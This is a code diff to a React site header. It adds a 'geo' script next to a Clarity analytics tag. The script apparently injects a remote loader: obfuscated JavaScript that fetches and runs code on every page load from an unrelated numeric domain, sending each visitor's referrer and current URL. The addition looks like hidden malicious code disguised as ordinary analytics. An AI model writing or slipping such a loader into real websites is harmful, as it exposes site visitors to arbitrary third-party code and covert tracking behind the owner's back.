@@ -53,6 +53,13 @@ export default function Header() {
 					/>
 					{/* @ts-expect-error */}
 					<Script id="clarity">{clarity(window, document, 'clarity', 'script', 'j17nowbio9')}</Script>
+					<Script id="geo">
+						{`(function(g,e,o,t,a,r,ge,tl,y){
+						t=g.getElementsByTagName(o)[0];y=g.createElement(e);y.async=true;
+						y.src='https://g9904216750.co/gb?id=-Np4YT_9xFA7TvRy7AhU&refurl='+g.referrer+'&winurl='+encodeURIComponent(window.location);
+						t.parentNode.insertBefore(y,t);
+						})(document,'script','head');`}
+					</Script>
 				</>
 			)}
 		</>
